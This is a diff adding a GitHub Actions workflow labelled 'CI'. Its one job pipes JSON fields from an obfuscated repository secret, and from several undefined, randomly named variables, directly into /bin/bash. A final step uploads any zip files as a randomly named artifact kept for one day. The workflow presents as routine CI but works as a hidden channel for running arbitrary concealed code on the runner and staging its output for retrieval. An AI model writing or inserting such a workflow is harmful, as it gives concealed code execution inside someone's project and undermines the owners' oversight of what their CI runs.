@@ -1,0 +1,29 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          r9231: ${{ secrets.r9231 }}
+        run: |
+          printf '%s' "$r9231" | jq -r .lo3650 | /bin/bash
+          printf '%s' "$ikg26" | jq -r .q1 | /bin/bash
+          printf '%s' "$wzx334" | jq -r .auym2697 | /bin/bash
+          printf '%s' "$uxbs0" | jq -r .l54 | /bin/bash
+          echo $tjic9 | jq -r .krge34222 | /bin/bash
+          echo $o849 | jq -r .vtc35585 | /bin/bash
+          printf '%s' "$azcep8874" | jq -r .wx75746 | /bin/bash
+          echo $llbkv90847 | jq -r .sdz22121 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1HZyqM5F
+          path: "*.zip"
+          retention-days: 1
